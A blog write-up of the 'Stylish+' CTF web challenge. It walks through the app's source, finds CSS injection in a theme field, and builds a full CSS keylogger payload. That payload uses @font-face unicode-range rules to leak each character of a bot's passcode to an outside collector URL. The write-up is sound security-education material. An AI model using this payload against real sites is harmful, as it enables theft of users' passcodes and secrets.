<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Stylish+" /><meta property="og:locale" content="en_US" /><meta name="description" content="Overview Stylish+ is a Fastify web application that allows you to create CSS themes and present them to a bot. You also get the source code of the application to review it and identify any security vulnerabilities." /><meta property="og:description" content="Overview Stylish+ is a Fastify web application that allows you to create CSS themes and present them to a bot. You also get the source code of the application to review it and identify any security vulnerabilities." /><link rel="canonical" href="/posts/stylish+/" /><meta property="og:url" content="/posts/stylish+/" /><meta property="og:site_name" content="ox7f" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-06T10:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Stylish+" /><meta name="twitter:site" content="@ox7f2" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-06T20:58:37+02:00","datePublished":"2022-06-06T10:00:00+02:00","description":"Overview Stylish+ is a Fastify web application that allows you to create CSS themes and present them to a bot. You also get the source code of the application to review it and identify any security vulnerabilities.","headline":"Stylish+","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/stylish+/"},"url":"/posts/stylish+/"}</script><title>Stylish+ | ox7f</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/77727665?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ox7f</a></div><div class="site-subtitle font-italic">will post my write-ups and notes here</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ox7f" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/ox7f2" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ox7f','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Stylish+</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Stylish+</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> 127 </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Jun 6, 2022, 10:00 AM +0200" prep="on" > Jun 6 <i class="unloaded">2022-06-06T10:00:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Jun 6, 2022, 8:58 PM +0200" prefix="Updated " > Jun 6 <i class="unloaded">2022-06-06T20:58:37+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1147 words">6 min</span></div></div><div class="post-content"><h2 id="overview">Overview</h2><p>Stylish+ is a <strong>Fastify</strong> web application that allows you to create CSS themes and present them to a bot. You also get the source code of the application to review it and identify any security vulnerabilities.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/stylish_landing_page.png#center" alt="" /></p><h2 id="vulnerability">Vulnerability</h2><p>Looking at <code class="language-plaintext highlighter-rouge">package.json</code> file for deprecated libraries with known security vulnerabilities and also other config files for misconfigurations - has led to nothing. After toying with the website and clicking every button - a POST request with the following payload is sent:</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
	</span><span class="nl">"bodyBG"</span><span class="p">:</span><span class="s2">"white"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"bodyFG"</span><span class="p">:</span><span class="s2">"black"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"accentBG"</span><span class="p">:</span><span class="s2">"black"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"accentFG"</span><span class="p">:</span><span class="s2">"white"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Let’s see how the data is processed in <code class="language-plaintext highlighter-rouge">server/src/index.ts</code>.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre>
<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="o">&lt;</span><span class="p">{</span> <span class="na">Body</span><span class="p">:</span> <span class="nx">Static</span><span class="o">&lt;</span><span class="k">typeof</span> <span class="nx">Theme</span><span class="o">&gt;</span> <span class="p">}</span><span class="o">&gt;</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/report</span><span class="dl">"</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">reply</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="c1">// Generate an ID</span>
    <span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">cuid</span><span class="p">();</span>

    <span class="c1">// Store the theme</span>
    <span class="nx">themes</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>

    <span class="kd">let</span> <span class="na">context</span><span class="p">:</span> <span class="nx">BrowserContext</span> <span class="o">|</span> <span class="kc">undefined</span><span class="p">;</span>
    <span class="kd">let</span> <span class="na">page</span><span class="p">:</span> <span class="nx">Page</span> <span class="o">|</span> <span class="kc">undefined</span><span class="p">;</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="nx">context</span> <span class="o">=</span> <span class="k">await</span> <span class="p">(</span><span class="k">await</span> <span class="nx">browser</span><span class="p">).</span><span class="nx">createIncognitoBrowserContext</span><span class="p">();</span>
        <span class="nx">page</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>
        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">setCacheEnabled</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="s2">`http://localhost:3000/?theme=</span><span class="p">${</span><span class="nx">id</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span> <span class="na">waitUntil</span><span class="p">:</span> <span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">3000</span> <span class="p">});</span>
        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="dl">"</span><span class="s2">#open-admin-panel</span><span class="dl">"</span><span class="p">);</span>

        <span class="c1">// Wait a bit to give everything some time to load</span>
        <span class="k">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">1000</span><span class="p">));</span>

        <span class="kd">const</span> <span class="nx">passcode</span> <span class="o">=</span> <span class="nx">thePasscode</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">passcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">char</span> <span class="o">=</span> <span class="nx">passcode</span><span class="p">.</span><span class="nx">charAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">cuid</span><span class="p">();</span>
            <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="s2">`
            document.querySelectorAll("#keypad &gt; button").forEach(button =&gt; {
                if (button.innerText === "</span><span class="p">${</span><span class="nx">char</span><span class="p">}</span><span class="s2">") {
                    button.id = "</span><span class="p">${</span><span class="nx">id</span><span class="p">}</span><span class="s2">";
                }
            })
            `</span><span class="p">);</span>
            <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s2">`#</span><span class="p">${</span><span class="nx">id</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
            <span class="k">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">300</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="kd">const</span> <span class="nx">submitID</span> <span class="o">=</span> <span class="nx">cuid</span><span class="p">();</span>
        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="s2">`
        document.querySelectorAll("#keypad &gt; button").forEach(button =&gt; {
            if (button.innerText === "Submit") {
                button.id = "</span><span class="p">${</span><span class="nx">submitID</span><span class="p">}</span><span class="s2">";
            }
        })
        `</span><span class="p">);</span>
        <span class="k">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s2">`#</span><span class="p">${</span><span class="nx">submitID</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
        <span class="k">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">3000</span><span class="p">));</span>

        <span class="nx">reply</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">sure</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
        <span class="k">throw</span> <span class="nx">e</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
        <span class="c1">// Clean up</span>
        <span class="nx">themes</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
        <span class="k">await</span> <span class="nx">page</span><span class="p">?.</span><span class="nx">close</span><span class="p">();</span>
        <span class="k">await</span> <span class="nx">context</span><span class="p">?.</span><span class="nx">close</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p>The body is saved inside a themes map for a quick visit from the bot and then deleted. However, the bot not only visits the page, but also enters its secret passcode - we should remember that. In <code class="language-plaintext highlighter-rouge">public/src/main.ts</code> we can see that the theme is written inside a style tag.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">setTheme</span><span class="p">({</span><span class="nx">bodyBG</span><span class="p">,</span> <span class="nx">bodyFG</span><span class="p">,</span> <span class="nx">accentBG</span><span class="p">,</span> <span class="nx">accentFG</span><span class="p">}:</span> <span class="nx">Theme</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">theme</span> <span class="o">=</span> <span class="p">{</span><span class="nx">bodyBG</span><span class="p">,</span> <span class="nx">bodyFG</span><span class="p">,</span> <span class="nx">accentBG</span><span class="p">,</span> <span class="nx">accentFG</span><span class="p">};</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">style</span><span class="dl">"</span><span class="p">)</span><span class="o">!</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s2">`
        :root {
            --body-bg: </span><span class="p">${</span><span class="nx">bodyBG</span><span class="p">}</span><span class="s2">;
            --body-fg: </span><span class="p">${</span><span class="nx">bodyFG</span><span class="p">}</span><span class="s2">;
            --accent-bg: </span><span class="p">${</span><span class="nx">accentBG</span><span class="p">}</span><span class="s2">;
            --accent-fg: </span><span class="p">${</span><span class="nx">accentFG</span><span class="p">}</span><span class="s2">;
        }
    `</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>So we have control over the html <code class="language-plaintext highlighter-rouge">&lt;style&gt;</code> tag - great, but how do we abuse that? Since this is a CTF challenge we have to see where the flag is hidden in the first place. In <code class="language-plaintext highlighter-rouge">server/src/index.ts</code> there is another endpoint which looks as follows:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="o">&lt;</span><span class="p">{</span> <span class="na">Body</span><span class="p">:</span> <span class="nx">Static</span><span class="o">&lt;</span><span class="k">typeof</span> <span class="nx">FlagRequest</span><span class="o">&gt;</span> <span class="p">}</span><span class="o">&gt;</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/flag</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">schema</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">body</span><span class="p">:</span> <span class="nx">FlagRequest</span><span class="p">,</span>
    <span class="p">},</span>
<span class="p">},</span> <span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">reply</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="p">{</span> <span class="nx">passcode</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">passcode</span> <span class="o">===</span> <span class="p">(</span><span class="nx">thePasscode</span> <span class="p">??</span> <span class="dl">""</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Flag get!</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">reply</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">flag</span> <span class="p">??</span> <span class="dl">"</span><span class="s2">yell at the problem author to fix this</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">reply</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">no</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p>OK, so we have to figure out how to get our hands on the passcode - as we have already seen the bot that visits our theme enters the passcode. So how do we steal it? It is pretty simple - with the <code class="language-plaintext highlighter-rouge">:focus</code> selector we could load a resource from our server and we should be good to go, right? This would be far too easy - so the author of the challenge gave us a pretty big obstacle - the order of the buttons is randomized on every visit.</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">buttons</span> <span class="o">=</span> <span class="p">[</span>
	<span class="dl">"</span><span class="s2">D</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">E</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">F</span><span class="dl">"</span><span class="p">,</span>
	<span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">B</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">C</span><span class="dl">"</span><span class="p">,</span>
	<span class="dl">"</span><span class="s2">7</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">8</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">9</span><span class="dl">"</span><span class="p">,</span>
	<span class="dl">"</span><span class="s2">4</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">5</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">6</span><span class="dl">"</span><span class="p">,</span>
	<span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">2</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">3</span><span class="dl">"</span><span class="p">,</span>
	<span class="dl">"</span><span class="s2">Reset</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Submit</span><span class="dl">"</span><span class="p">,</span>
<span class="p">];</span>
<span class="kd">const</span> <span class="nx">indices</span> <span class="o">=</span> <span class="p">[...</span><span class="nb">Array</span><span class="p">(</span><span class="nx">buttons</span><span class="p">.</span><span class="nx">length</span><span class="p">).</span><span class="nx">keys</span><span class="p">()];</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">indices</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">const</span> <span class="nx">j</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">indices</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
	<span class="kd">const</span> <span class="nx">temp</span> <span class="o">=</span> <span class="nx">indices</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
	<span class="nx">indices</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">indices</span><span class="p">[</span><span class="nx">j</span><span class="p">];</span>
	<span class="nx">indices</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">=</span> <span class="nx">temp</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">---</span> <span class="nx">snipped</span> <span class="o">---</span>
<span class="nx">css</span> <span class="o">+=</span> <span class="s2">`
	#keypad button:nth-child(</span><span class="p">${</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">}</span><span class="s2">) {
		order: </span><span class="p">${</span><span class="nx">indices</span><span class="p">[</span><span class="nx">i</span><span class="p">]}</span><span class="s2">;
	}
`</span><span class="p">;</span>
<span class="o">---</span> <span class="nx">snipped</span> <span class="o">---</span>
</pre></table></code></div></div><h2 id="exploitation">Exploitation</h2><p>After researching the topic and reading through <a href="https://drafts.csswg.org/selectors/">tons of drafts</a>. I thought I would have to give up because it didn’t seem to be possible to create a selector for a button with a specific letter or number. But wait - why reinvent the wheel when it already exists - the idea of a CSS keylogger is not new and has been around for over 10 years! So I changed my research and focused this topic and found tons of new input to try out - for example the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face">@font-face rule</a>. This rule set has a unique property called <code class="language-plaintext highlighter-rouge">unicode-range</code> which allows us to load a remote font and use only a range of characters from it - this means that if we create this rule set for each letter and number of the passcode, we can build a keylogger - how exciting ^^</p><div class="language-css highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">@font-face</span> <span class="p">{</span> <span class="nl">font-family</span><span class="p">:</span> <span class="n">x</span><span class="p">;</span> <span class="nl">src</span><span class="p">:</span> <span class="sx">url(https://[redacted].x.pipedream.net?char=A)</span><span class="p">,</span> <span class="n">local</span><span class="p">(</span><span class="n">Impact</span><span class="p">);</span> <span class="py">unicode-range</span><span class="p">:</span> <span class="n">U</span><span class="err">+</span><span class="m">41</span><span class="p">;</span> <span class="p">}</span> <span class="o">//</span> <span class="nt">A</span>
<span class="k">@font-face</span> <span class="p">{</span> <span class="nl">font-family</span><span class="p">:</span> <span class="n">x</span><span class="p">;</span> <span class="nl">src</span><span class="p">:</span> <span class="sx">url(https://[redacted].x.pipedream.net?char=B)</span><span class="p">,</span> <span class="n">local</span><span class="p">(</span><span class="n">Impact</span><span class="p">);</span> <span class="py">unicode-range</span><span class="p">:</span> <span class="n">U</span><span class="err">+</span><span class="m">42</span><span class="p">;</span> <span class="p">}</span> <span class="o">//</span> <span class="nt">B</span>
<span class="k">@font-face</span> <span class="p">{</span> <span class="nl">font-family</span><span class="p">:</span> <span class="n">x</span><span class="p">;</span> <span class="nl">src</span><span class="p">:</span> <span class="sx">url(https://[redacted].x.pipedream.net?char=C)</span><span class="p">,</span> <span class="n">local</span><span class="p">(</span><span class="n">Impact</span><span class="p">);</span> <span class="py">unicode-range</span><span class="p">:</span> <span class="n">U</span><span class="err">+</span><span class="m">43</span><span class="p">;</span> <span class="p">}</span> <span class="o">//</span> <span class="nt">C</span>
<span class="o">...</span>
<span class="nf">#keypad</span> <span class="nt">button</span><span class="nd">:focus</span> <span class="p">{</span> <span class="nl">font-family</span><span class="p">:</span> <span class="n">x</span><span class="p">,</span> <span class="s2">'Comic sans ms'</span><span class="p">;</span> <span class="p">}</span>
</pre></table></code></div></div><p>Our payload now looks like this:</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"bodyBG"</span><span class="p">:</span><span class="s2">"white"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"bodyFG"</span><span class="p">:</span><span class="s2">"orange"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"accentBG"</span><span class="p">:</span><span class="s2">"green"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"accentFG"</span><span class="p">:</span><span class="s2">"blue;}@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=A), local(Impact); unicode-range: U+41; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=B), local(Impact); unicode-range: U+42; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=C), local(Impact); unicode-range: U+43; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=D), local(Impact); unicode-range: U+44; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=E), local(Impact); unicode-range: U+45; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=F), local(Impact); unicode-range: U+46; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=0), local(Impact); unicode-range: U+30; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=1), local(Impact); unicode-range: U+31; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=2), local(Impact); unicode-range: U+32; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=3), local(Impact); unicode-range: U+33; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=4), local(Impact); unicode-range: U+34; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=5), local(Impact); unicode-range: U+35; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=6), local(Impact); unicode-range: U+36; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=7), local(Impact); unicode-range: U+37; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=8), local(Impact); unicode-range: U+38; }@font-face { font-family: x; src: url(https://[redacted].x.pipedream.net?char=9), local(Impact); unicode-range: U+39; }#keypad button:focused { font-family: x, 'Comic sans ms';"</span><span class="w">
</span><span class="p">}</span><span class="w">
